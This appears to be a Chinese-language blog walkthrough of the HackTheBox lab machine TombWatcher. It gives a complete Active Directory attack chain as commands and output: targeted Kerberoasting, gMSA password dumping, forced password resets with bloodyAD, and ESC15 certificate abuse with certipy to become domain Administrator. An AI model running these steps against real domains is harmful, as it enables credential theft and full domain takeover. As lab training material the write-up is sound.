{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - TombWatcher","contentHtml":"<h1>Season8 - TombWatcher</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/TombWatcher\">https://app.hackthebox.com/machines/TombWatcher</a> | <code>Windows</code> | <code>Medium</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image.png\" alt=\"image.png\"></p>\n<p>Machine Information：As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!</p>\n<h2>Recon</h2>\n<h3>端口扫描</h3>\n<p><code>nmap</code> 端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher nmap -sT -min-rate 5000 10.10.11.72  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:01 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.72\nHost is up (0.059s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 1.24 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher nmap -sT -A -p 53,80,88,135,139,389,445,464,5985 10.10.11.72                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:03 CST                                                   \nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.72                         \nHost is up (0.10s latency).    \n                                                         \nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0    \n|_http-server-header: Microsoft-IIS/10.0                                                                          \n| http-methods:                                                                                                   \n|_  Potentially risky methods: TRACE            \n|_http-title: IIS Windows Server    \n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-06-08 07:41:39Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-06-08T07:42:31+00:00; +3h38m21s from scanner <span class=\"hljs-keyword\">time</span>.\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-06-08T07:41:51\n|_  start_date: N/A\n|_clock-skew: mean: 3h38m20s, deviation: 0s, median: 3h38m20s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   85.41 ms  10.10.16.1\n2   128.13 ms 10.10.11.72\n</code></pre>\n<p>访问<code>HTTP</code>，是默认页</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image1.png\" alt=\"image.png\"></p>\n<p>扫描了一波，没什么东西，重点应该不在这，因为给了凭据</p>\n<h3>凭据测试 &#x26; 服务枚举</h3>\n<p>使用 <code>nxc</code> 对凭据进行测试</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher nxc smb 10.10.11.72 -u henry -p <span class=\"hljs-string\">'H3nry_987TGV!'</span> -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\n➜  TombWatcher nxc ldap 10.10.11.72 -u henry -p <span class=\"hljs-string\">'H3nry_987TGV!'</span> -d tombwatcher.htb\nLDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nLDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\n➜  TombWatcher nxc wmi 10.10.11.72 -u henry -p <span class=\"hljs-string\">'H3nry_987TGV!'</span> -d tombwatcher.htb\nRPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nRPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\n➜  TombWatcher nxc winrm 10.10.11.72 -u henry -p <span class=\"hljs-string\">'H3nry_987TGV!'</span> -d tombwatcher.htb\nWINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nWINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\\henry:H3nry_987TGV!\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher wmiexec.py tombwatcher.htb/henry:<span class=\"hljs-string\">'H3nry_987TGV!'</span>@10.10.11.72 -dc-ip 10.10.11.72\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED\n</code></pre>\n<p><code>SMB</code> 也是没什么信息</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher smbclient -L 10.10.11.72 -U tombwatcher.htb/henry%<span class=\"hljs-string\">'H3nry_987TGV!'</span>\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<h2>域分析 - 1</h2>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher bloodhound-python -u henry -p <span class=\"hljs-string\">'H3nry_987TGV!'</span> -d <span class=\"hljs-string\">'tombwatcher.htb'</span> -ns 10.10.11.72 --zip -c All -dc <span class=\"hljs-string\">'DC01.tombwatcher.htb'</span> --dns-tcp\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: tombwatcher.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: DC01.tombwatcher.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.tombwatcher.htb\nINFO: Found 12 <span class=\"hljs-built_in\">users</span>\nINFO: Found 53 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.tombwatcher.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 12S\nINFO: Compressing output into 20250608163651_bloodhound.zip\n</code></pre>\n<p><code>henry</code> 所属组权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image2.png\" alt=\"image.png\"></p>\n<p>对<code>Alfred</code>有<code>writeSPN</code>权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image3.png\" alt=\"image.png\"></p>\n<p>我们再看一下 <code>Alfred</code> 的权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image4.png\" alt=\"image.png\"></p>\n<p>继续跟进<code>INFRASTRUCTURE</code> 组，能够读取机器<code>ANSIBLE_DEV</code>的<code>GMSA</code>密码</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image5.png\" alt=\"image.png\"></p>\n<p>然后 <code>ANSIBLE_DEV</code> 能够更改 <code>SAM</code> 用户密码</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image6.png\" alt=\"image.png\"></p>\n<p>并且 <code>SAM</code> 用户对 <code>JOHN</code>用户拥有 <code>genericAll</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image7.png\" alt=\"image.png\"></p>\n<p>用户<code>John</code>的权限，是远程管理组的成员</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image8.png\" alt=\"image.png\"></p>\n<h2>域渗透</h2>\n<h3>Kerberoasting</h3>\n<blockquote>\n<p><a href=\"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting\">https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting</a></p>\n</blockquote>\n<p>攻击者可以将 SPN （<code>ServicePrincipalName</code>） 添加到该帐户。一旦账户拥有 SPN，它就容易受到 <code>Kerberoast</code> 的攻击 。这种技术称为 <code>Targeted Kerberoasting</code></p>\n<p>工具链接：<a href=\"https://github.com/ShutdownRepo/targetedKerberoast\">https://github.com/ShutdownRepo/targetedKerberoast</a></p>\n<pre><code class=\"hljs language-bash\">➜  targetedKerberoast python targetedKerberoast.py -v -d tombwatcher.htb --dc-ip 10.10.11.72 -u henry -p <span class=\"hljs-string\">'H3nry_987TGV!'</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image9.png\" alt=\"image.png\"></p>\n<p>使用<code>hashcat</code>进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  targetedKerberoast hashcat -m 13100 <span class=\"hljs-built_in\">hash</span> /usr/share/wordlists/rockyou.txt \n</code></pre>\n<p>得到密码 <code>basketball</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image10.png\" alt=\"image.png\"></p>\n<h3>ReadGMSAPassword</h3>\n<p>测试<code>alfred</code>的凭据</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher nxc smb 10.10.11.72 -u alfred -p <span class=\"hljs-string\">'basketball'</span> -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\alfred:basketball \n</code></pre>\n<p>上边分析域的时候能知道<code>alfred</code>用户可以读取<code>ANSIBLE_DEV</code> 计算机的<code>GMSA</code>密码</p>\n<p>工具：<a href=\"https://github.com/micahvandeusen/gMSADumper\">https://github.com/micahvandeusen/gMSADumper</a></p>\n<pre><code class=\"hljs language-bash\">➜  gMSADumper python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb\nUsers or <span class=\"hljs-built_in\">groups</span> <span class=\"hljs-built_in\">who</span> can <span class=\"hljs-built_in\">read</span> password <span class=\"hljs-keyword\">for</span> ansible_dev$:\n > Infrastructure\nansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc\nansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3\nansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a\n</code></pre>\n<p>测试<code>ansible_dev$</code>的凭据</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher nxc smb 10.10.11.72 -u <span class=\"hljs-string\">'ansible_dev$'</span> -H <span class=\"hljs-string\">'1c37d00093dc2a5f25176bf2d474afdc'</span> -d tombwatcher.htb   \nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc \n</code></pre>\n<h3>To John</h3>\n<p><code>ansible_dev$</code> 拥有更改 <code>SAM</code>用户密码的权限</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher bloodyAD -d tombwatcher.htb -u <span class=\"hljs-string\">'ansible_dev$'</span> -p <span class=\"hljs-string\">':1c37d00093dc2a5f25176bf2d474afdc'</span> --dc-ip 10.10.11.72 <span class=\"hljs-built_in\">set</span> password SAM <span class=\"hljs-string\">'Password123!'</span>\n[+] Password changed successfully!\n</code></pre>\n<p>测试 <code>SAM</code> 凭据</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher nxc smb 10.10.11.72 -u <span class=\"hljs-string\">'SAM'</span> -p <span class=\"hljs-string\">'Password123!'</span> -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\SAM:Password123! \n</code></pre>\n<p>我们再通过<code>SAM</code>用户修改<code>John</code>用户的密码</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher bloodyAD -d tombwatcher.htb -u <span class=\"hljs-string\">'SAM'</span> -p <span class=\"hljs-string\">'Password123!'</span> --dc-ip 10.10.11.72 <span class=\"hljs-built_in\">set</span> owner john sam\n[!] S-1-5-21-1392491010-1358638721-2126982587-1105 is already the owner, no modification will be made\n\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u <span class=\"hljs-string\">'SAM'</span> -p <span class=\"hljs-string\">'Password123!'</span> --dc-ip 10.10.11.72 add genericAll john sam\n[+] sam has now GenericAll on john\n\n➜  TombWatcher bloodyAD -d tombwatcher.htb -u <span class=\"hljs-string\">'SAM'</span> -p <span class=\"hljs-string\">'Password123!'</span> --dc-ip 10.10.11.72 <span class=\"hljs-built_in\">set</span> password JOHN <span class=\"hljs-string\">'Password123!'</span>\n[+] Password changed successfully!\n</code></pre>\n<p>使用 <code>evil-winrm</code> 进行登录</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher evil-winrm -i 10.10.11.72 -u <span class=\"hljs-string\">'JOHn'</span> -p <span class=\"hljs-string\">'Password123!'</span>                \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class=\"hljs-string\">' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\john\\Documents> \n</span></code></pre>\n<p>能读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\john\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\n3941928223b1baf7d3a3b94a3953d597\n</code></pre>\n<h2>域分析 - 2</h2>\n<p>拿到 <code>John</code> 用户后，我们再进行分析一次，寻找获得<code>Root</code>的路径</p>\n<p><code>John</code> 的权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image11.png\" alt=\"image.png\"></p>\n<p>这名字带<code>CERT</code>，修改<code>CERT_ADMIN</code>密码，并用其尝试使用 <code>certipy</code> 枚举漏洞</p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher bloodyAD -d tombwatcher.htb -u <span class=\"hljs-string\">'JOHN'</span> -p <span class=\"hljs-string\">'Password123!'</span> --dc-ip 10.10.11.72 <span class=\"hljs-built_in\">set</span> password CERT_ADMIN <span class=\"hljs-string\">'Password123!'</span>\n[+] Password changed successfully!\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher certipy-ad find -u <span class=\"hljs-string\">'CERT_ADMIN'</span> -p <span class=\"hljs-string\">'Password123!'</span> -dc-ip 10.10.11.72 -vulnerable\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 13 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'tombwatcher-CA-1'</span> via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Successfully retrieved CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'tombwatcher-CA-1'</span>\n[*] Checking web enrollment <span class=\"hljs-keyword\">for</span> CA <span class=\"hljs-string\">'tombwatcher-CA-1'</span> @ <span class=\"hljs-string\">'DC01.tombwatcher.htb'</span>\n[!] Error checking web enrollment: timed out\n[!] Use -debug to <span class=\"hljs-built_in\">print</span> a stacktrace\n[*] Saving text output to <span class=\"hljs-string\">'20250608182737_Certipy.txt'</span>\n[*] Wrote text output to <span class=\"hljs-string\">'20250608182737_Certipy.txt'</span>\n[*] Saving JSON output to <span class=\"hljs-string\">'20250608182737_Certipy.json'</span>\n[*] Wrote JSON output to <span class=\"hljs-string\">'20250608182737_Certipy.json'</span>\n</code></pre>\n<p>检测到 <code>ESC15</code></p>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher <span class=\"hljs-built_in\">cat</span> 20250608182737_Certipy.txt  \nCertificate Authorities                    \n  0                                        \n    CA Name                             : tombwatcher-CA-1\n    DNS Name                            : DC01.tombwatcher.htb\n    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb\n    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC\n    Certificate Validity Start          : 2024-11-16 00:47:48+00:00\n    Certificate Validity End            : 2123-11-16 00:57:48+00:00\n    Web Enrollment          \n      HTTP                                                                                                        \n        Enabled                         : False                                                                   \n      HTTPS                                                                                                       \n        Enabled                         : False\n    User Specified SAN                  : Disabled                                                                \n    Request Disposition                 : Issue                                                                   \n    Enforce Encryption <span class=\"hljs-keyword\">for</span> Requests     : Enabled                                                                 \n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions                                                                                                   \n      Owner                             : TOMBWATCHER.HTB\\Administrators\n      Access Rights                                                                                               \n        ManageCa                        : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins    \n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        ManageCertificates              : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins                 \n        Enroll                          : TOMBWATCHER.HTB\\Authenticated Users      \nCertificate Templates\n  0\n    Template Name                       : WebServer\n    Display Name                        : Web Server\n    Certificate Authorities             : tombwatcher-CA-1\n    Enabled                             : True\n    Client Authentication               : False\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Extended Key Usage                  : Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Schema Version                      : 1\n    Validity Period                     : 2 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Template Created                    : 2024-11-16T00:57:49+00:00\n    Template Last Modified              : 2024-11-16T17:07:26+00:00\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n      Object Control Permissions\n        Owner                           : TOMBWATCHER.HTB\\Enterprise Admins\n        Full Control Principals         : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Owner Principals          : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Dacl Principals           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Property Enroll           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n    [+] User Enrollable Principals      : TOMBWATCHER.HTB\\cert_admin\n    [!] Vulnerabilities\n      ESC15                             : Enrollee supplies subject and schema version is 1.\n    [*] Remarks\n      ESC15                             : Only applicable <span class=\"hljs-keyword\">if</span> the environment has not been patched. See CVE-2024-49019 or the wiki <span class=\"hljs-keyword\">for</span> more details.\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image12.png\" alt=\"image.png\"></p>\n<h2>ESC 15</h2>\n<blockquote>\n<p><a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu\">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu</a></p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher certipy-ad req \\\n    -u <span class=\"hljs-string\">'CERT_ADMIN'</span> -p <span class=\"hljs-string\">'Password123!'</span> \\\n    -dc-ip <span class=\"hljs-string\">'10.10.11.72'</span> -target <span class=\"hljs-string\">'DC01.tombwatcher.htb'</span> \\\n    -ca <span class=\"hljs-string\">'tombwatcher-CA-1'</span> -template <span class=\"hljs-string\">'WebServer'</span> \\\n    -upn <span class=\"hljs-string\">'administrator@tombwatcher.htb'</span> \\\n    -application-policies <span class=\"hljs-string\">'Client Authentication'</span>\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 33\n[*] Successfully requested certificate\n[*] Got certificate with UPN <span class=\"hljs-string\">'administrator@tombwatcher.htb'</span>\n[*] Certificate has no object SID\n[*] Try using -sid to <span class=\"hljs-built_in\">set</span> the object SID or see the wiki <span class=\"hljs-keyword\">for</span> more details\n[*] Saving certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n[*] Wrote certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  TombWatcher certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: <span class=\"hljs-string\">'administrator@tombwatcher.htb'</span>\n[*] Connecting to <span class=\"hljs-string\">'ldaps://10.10.11.72:636'</span>\n[*] Authenticated to <span class=\"hljs-string\">'10.10.11.72'</span> as: <span class=\"hljs-string\">'u:TOMBWATCHER\\\\Administrator'</span>\nType <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> list of commands\n\n<span class=\"hljs-comment\"># whoami</span>\nu:TOMBWATCHER\\Administrator\n</code></pre>\n<p>我直接把 <code>henry</code> 加入管理员组和远程组</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># add_user_to_group henry \"Domain Admins\"</span>\nAdding user: Henry to group Domain Admins result: OK\n\n<span class=\"hljs-comment\"># add_user_to_group henry \"REMOTE MANAGEMENT USERS\"</span>\nAdding user: Henry to group Remote Management Users result: OK\n</code></pre>\n<p>使用 <code>evil-winrm</code> 登录并读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\administrator\\desktop> <span class=\"hljs-built_in\">type</span> root.txt\n6d2352d2fcafb6b19e95e737b046864c\n</code></pre>\n<h2>总结</h2>\n<p>一波下来直接梭哈，这次没有卡住的地方</p>\n<p>但是我打完后发现，我<code>BloodHound</code>收集信息的时候，机器已经是被人修改过的了</p>\n<p>正常来说我是不能直接在<code>BloodHound</code>中发现<code>CERT_ADMIN</code>用户的，因为它是已经被删除的用户，我需要对其进行恢复，再进行后续操作</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># Enum isDeleted ADObject</span>\nGet-ADObject -Filter <span class=\"hljs-string\">'isDeleted -eq $true'</span> -IncludeDeletedObjects\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20TombWatcher/image13.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># 恢复账号</span>\nRestore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\n<span class=\"hljs-comment\"># 激活账号</span>\nEnable-ADAccount -Identity cert_admin\n</code></pre>\n<p>然后才可以是用<code>BloodAD</code>进行修改密码，这里相当于给我降难度了</p>\n<pre><code class=\"hljs language-bash\">(Get-Acl <span class=\"hljs-string\">\"AD:CN=john,CN=Users,DC=tombwatcher,DC=htb\"</span>).Access\n</code></pre>","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","updated":"2025-06-08","tags":["HackTheBox","Windows","ADCS","ESC15","Kerberoasting","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - TombWatcher\n\n https://app.hackthebox.com/machines/TombWatcher | `Windows` | `Medium`\n \n\n\n\nMachine Information：As is common in real life Windows pentests, you will start the TombWatcher box w...","isEncrypted":true},"recentPosts":[{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}